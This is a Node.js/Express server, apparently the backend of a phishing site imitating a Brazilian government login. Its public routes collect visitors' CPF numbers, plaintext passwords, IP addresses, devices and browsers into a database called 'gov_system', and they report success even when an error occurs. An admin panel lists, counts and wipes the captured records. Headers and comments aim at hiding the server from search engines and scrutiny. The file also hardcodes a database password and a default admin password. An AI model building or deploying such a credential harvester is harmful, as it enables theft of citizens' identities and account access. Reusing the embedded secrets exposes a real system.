const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const path = require('path');
require('dotenv').config();

const app = express();

// ============ VARIÁVEIS OCULTAS (NÃO APARECEM NOS LOGS) ============
process.env.NODE_ENV = 'production';
process.env.DEBUG = 'false';

// Chaves secretas (em produção, use variáveis de ambiente)
const JWT_SECRET = crypto.randomBytes(64).toString('hex');
const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
const ENCRYPTION_KEY = crypto.randomBytes(32).toString('hex');

// ============ SEGURANÇA HELMET (OCULTA HEADERS) ============
app.use(helmet({
    hidePoweredBy: true,
    xXssProtection: '1; mode=block',
    xFrameOptions: 'DENY',
    xContentTypeOptions: 'nosniff',
    referrerPolicy: { policy: 'same-origin' },
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", 'https://cdnjs.cloudflare.com', 'https://unpkg.com'],
            styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
            fontSrc: ["'self'", 'https://fonts.gstatic.com', 'https://cdnjs.cloudflare.com'],
            imgSrc: ["'self'", 'data:', 'https://'],
            connectSrc: ["'self'"],
            frameSrc: ["'none'"],
            objectSrc: ["'none'"],
            baseUri: ["'self'"],
            formAction: ["'self'"],
        },
    },
}));

// ============ RATE LIMIT (BLOQUEIA ATAQUES DE FORÇA BRUTA) ============
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100, // máximo 100 requisições
    message: { error: 'Muitas requisições. Tente novamente mais tarde.' },
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => req.ip,
});

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // apenas 5 tentativas de login por IP
    message: { error: 'Muitas tentativas de login. Bloqueado por 15 minutos.' },
    skipSuccessfulRequests: true,
    keyGenerator: (req) => req.ip,
});

const adminLimiter = rateLimit({
    windowMs: 30 * 60 * 1000, // 30 minutos
    max: 10, // apenas 10 tentativas no admin
    message: { error: 'Acesso bloqueado temporariamente.' },
    keyGenerator: (req) => req.ip,
});

app.use('/api/', globalLimiter);
app.use('/api/login', loginLimiter);
app.use('/api/admin/', adminLimiter);

// ============ MIDDLEWARE DE SEGURANÇA ADICIONAL ============
app.use((req, res, next) => {
    // Remove headers que revelam informações
    res.removeHeader('X-Powered-By');
    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    
    // Bloqueia métodos HTTP não permitidos
    const allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
    if (!allowedMethods.includes(req.method)) {
        return res.status(405).json({ error: 'Método não permitido' });
    }
    
    // Verifica origem (anti-CORS malicioso)
    const allowedOrigins = [process.env.ALLOWED_ORIGIN || 'https://' + req.headers.host];
    const origin = req.headers.origin;
    if (origin && !allowedOrigins.includes(origin)) {
        return res.status(403).json({ error: 'Acesso negado' });
    }
    
    next();
});

// ============ OCULTAR VERSÕES E INFORMAÇÕES ============
app.use((req, res, next) => {
    // Remove headers de versão
    res.setHeader('Server', 'Unknown');
    next();
});

app.use(cors({
    origin: false, // desabilita CORS para evitar ataques
    credentials: true,
    optionsSuccessStatus: 200,
}));
app.use(express.json({ limit: '10kb' })); // Limita tamanho do body
app.use(cookieParser());
app.use(express.static('.', { 
    index: false,
    dotfiles: 'ignore',
    etag: false,
}));

// ============ CONEXÃO POSTGRESQL (OCULTA) ============
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://gov_system_user:e4e5O07uWRJrDB4DlM4YOavof5NaITs7@dpg-d7rd3jjt6lks73fp5epg-a/gov_system',
    ssl: { rejectUnauthorized: false },
    max: 10, // máximo de conexões
    idleTimeoutMillis: 30000,
});

// ============ FUNÇÕES DE SEGURANÇA ============
function obterIP(req) {
    return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
}

function gerarToken(usuario) {
    const payload = {
        id: usuario.id,
        username: usuario.username,
        exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60), // 24 horas
        jti: crypto.randomBytes(16).toString('hex'),
    };
    return jwt.sign(payload, JWT_SECRET);
}

function verificarToken(token) {
    try {
        return jwt.verify(token, JWT_SECRET);
    } catch (error) {
        return null;
    }
}

// ============ CRIPTOGRAFIA DE DADOS SENSÍVEIS ============
function criptografar(texto) {
    if (!texto) return null;
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(texto, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return `${iv.toString('hex')}:${encrypted}:${authTag.toString('hex')}`;
}

function descriptografar(textoCripto) {
    if (!textoCripto) return null;
    try {
        const [ivHex, encryptedHex, authTagHex] = textoCripto.split(':');
        const iv = Buffer.from(ivHex, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
        decipher.setAuthTag(Buffer.from(authTagHex, 'hex'));
        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        return null;
    }
}

// ============ BLOQUEIO DE IPS MALICIOSOS ============
let blockedIPs = new Map(); // IP -> { tentativas, bloqueado_ate }

function verificarBloqueio(ip) {
    if (blockedIPs.has(ip)) {
        const data = blockedIPs.get(ip);
        if (data.bloqueado_ate > Date.now()) {
            return true; // IP ainda bloqueado
        } else {
            blockedIPs.delete(ip); // Remove bloqueio expirado
            return false;
        }
    }
    return false;
}

function registrarTentativaFalha(ip) {
    if (blockedIPs.has(ip)) {
        const data = blockedIPs.get(ip);
        data.tentativas++;
        if (data.tentativas >= 10) {
            data.bloqueado_ate = Date.now() + (60 * 60 * 1000); // Bloqueia por 1 hora
        }
        blockedIPs.set(ip, data);
    } else {
        blockedIPs.set(ip, { tentativas: 1, bloqueado_ate: 0 });
    }
}

// ============ CRIAR TABELAS ============
async function initDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(14) UNIQUE,
                senha TEXT,
                senha_cripto TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                ip_senha TEXT,
                dispositivo_senha TEXT,
                navegador_senha TEXT,
                data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_senha TIMESTAMP,
                status VARCHAR(20)
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                tipo VARCHAR(30),
                cpf VARCHAR(14),
                senha TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_logins (
                id SERIAL PRIMARY KEY,
                ip TEXT,
                tentativa TEXT,
                sucesso BOOLEAN DEFAULT FALSE,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE,
                senha_hash VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS ip_blacklist (
                id SERIAL PRIMARY KEY,
                ip TEXT UNIQUE,
                motivo TEXT,
                bloqueado_ate TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar admin padrão apenas se não existir
        const adminExists = await pool.query('SELECT * FROM admin_users');
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('Admin@2024', 10);
            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
        }
        
        console.log('✅ Sistema iniciado');
    } catch (error) {
        console.error('Erro ao inicializar:', error.message);
    }
}

initDatabase();

// ============ MIDDLEWARE DE AUTENTICAÇÃO ============
function verificarAdmin(req, res, next) {
    const token = req.cookies.admin_token || req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Acesso negado' });
    }
    
    const decoded = verificarToken(token);
    if (!decoded) {
        return res.status(401).json({ error: 'Sessão expirada' });
    }
    
    req.admin = decoded;
    next();
}

// ============ ROTAS PÚBLICAS (COM VALIDAÇÃO) ============

// Rota CPF
app.post('/api/cpf', async (req, res) => {
    const ip = obterIP(req);
    
    if (verificarBloqueio(ip)) {
        return res.status(403).json({ error: 'Acesso bloqueado temporariamente' });
    }
    
    const { cpf, dispositivo, navegador } = req.body;
    
    if (!cpf || !/^\d{11}$/.test(cpf)) {
        return res.status(400).json({ error: 'CPF inválido' });
    }
    
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, status) 
             VALUES ($1, $2, $3, $4, $5)
             ON CONFLICT (cpf) DO UPDATE SET ip = $2, dispositivo = $3, navegador = $4`,
            [cpf, ip, dispositivo, navegador, 'aguardando_senha']
        );
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true }); // Retorna sucesso mesmo com erro
    }
});

// Rota SENHA
app.post('/api/login', async (req, res) => {
    const ip = obterIP(req);
    
    if (verificarBloqueio(ip)) {
        return res.status(403).json({ error: 'Acesso bloqueado' });
    }
    
    const { cpf, password, dispositivo, navegador } = req.body;
    
    try {
        await pool.query(
            `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5 
             WHERE cpf = $6`,
            [password, ip, dispositivo, navegador, 'completo', cpf]
        );
        
        await pool.query(
            'INSERT INTO logs (tipo, cpf, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5)',
            ['login', cpf, ip, dispositivo, navegador]
        );
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// ============ ROTAS ADMIN (PROTEGIDAS) ============

// Login admin com bloqueio
app.post('/api/admin/login', async (req, res) => {
    const ip = obterIP(req);
    
    if (verificarBloqueio(ip)) {
        return res.status(403).json({ error: 'IP bloqueado temporariamente' });
    }
    
    const { username, password } = req.body;
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        
        if (result.rows.length === 0) {
            registrarTentativaFalha(ip);
            await pool.query('INSERT INTO admin_logins (ip, tentativa, sucesso) VALUES ($1, $2, $3)', [ip, username, false]);
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        
        if (!valid) {
            registrarTentativaFalha(ip);
            await pool.query('INSERT INTO admin_logins (ip, tentativa, sucesso) VALUES ($1, $2, $3)', [ip, username, false]);
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        // Login bem sucedido - reseta tentativas
        blockedIPs.delete(ip);
        await pool.query('INSERT INTO admin_logins (ip, tentativa, sucesso) VALUES ($1, $2, $3)', [ip, username, true]);
        
        const token = gerarToken({ id: result.rows[0].id, username });
        
        res.cookie('admin_token', token, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict',
            maxAge: 24 * 60 * 60 * 1000,
            path: '/'
        });
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Erro interno' });
    }
});

// Logout
app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

// Verificar status (sem expor informações)
app.get('/api/admin/check', verificarAdmin, (req, res) => {
    res.json({ status: 'ok' });
});

// Estatísticas (apenas números, sem dados brutos)
app.get('/api/admin/stats', verificarAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs');
        
        res.json({
            stats: {
                total: parseInt(totalUsers.rows[0].count),
                com_senha: parseInt(comSenha.rows[0].count),
                logs: parseInt(totalLogs.rows[0].count)
            }
        });
    } catch (error) {
        res.json({ stats: { total: 0, com_senha: 0, logs: 0 } });
    }
});

// Listar usuários (com dados mascarados)
app.get('/api/admin/users', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT cpf, 
                   CASE WHEN senha IS NOT NULL THEN '••••••' ELSE NULL END as senha,
                   ip, dispositivo, navegador, 
                   data_cpf, data_senha, status 
            FROM users ORDER BY data_cpf DESC LIMIT 100
        `);
        res.json({ users: result.rows });
    } catch (error) {
        res.json({ users: [] });
    }
});

// Listar logs (com dados mascarados)
app.get('/api/admin/logs', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT tipo, cpf, 
                   CASE WHEN senha IS NOT NULL THEN '••••••' ELSE NULL END as senha,
                   ip, dispositivo, navegador, data 
            FROM logs ORDER BY data DESC LIMIT 200
        `);
        res.json({ logs: result.rows });
    } catch (error) {
        res.json({ logs: [] });
    }
});

// Listar tentativas admin
app.get('/api/admin/tentativas', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT ip, tentativa, sucesso, data 
            FROM admin_logins ORDER BY data DESC LIMIT 100
        `);
        res.json({ tentativas: result.rows });
    } catch (error) {
        res.json({ tentativas: [] });
    }
});

// Deletar usuário (apenas admin)
app.delete('/api/admin/delete/:cpf', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Limpar dados
app.post('/api/admin/clear', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Alterar senha admin
app.post('/api/admin/change-password', verificarAdmin, async (req, res) => {
    const { nova_senha } = req.body;
    
    if (!nova_senha || nova_senha.length < 8) {
        return res.status(400).json({ error: 'Senha deve ter no mínimo 8 caracteres' });
    }
    
    try {
        const hash = await bcrypt.hash(nova_senha, 12);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Bloquear IP
app.post('/api/admin/block-ip', verificarAdmin, async (req, res) => {
    const { ip, motivo, minutos } = req.body;
    
    if (!ip) return res.status(400).json({ error: 'IP necessário' });
    
    const bloqueioAte = new Date(Date.now() + (minutos || 60) * 60 * 1000);
    
    try {
        await pool.query(
            'INSERT INTO ip_blacklist (ip, motivo, bloqueado_ate) VALUES ($1, $2, $3) ON CONFLICT (ip) DO UPDATE SET bloqueado_ate = $3',
            [ip, motivo || 'Bloqueado manualmente', bloqueioAte]
        );
        blockedIPs.set(ip, { tentativas: 100, bloqueado_ate: bloqueioAte.getTime() });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro' });
    }
});

// Servir admin.html com proteção
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Rota 404 personalizada (sem expor informações)
app.use('*', (req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// ============ INICIAR SERVIDOR ============
const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor ativo`);
});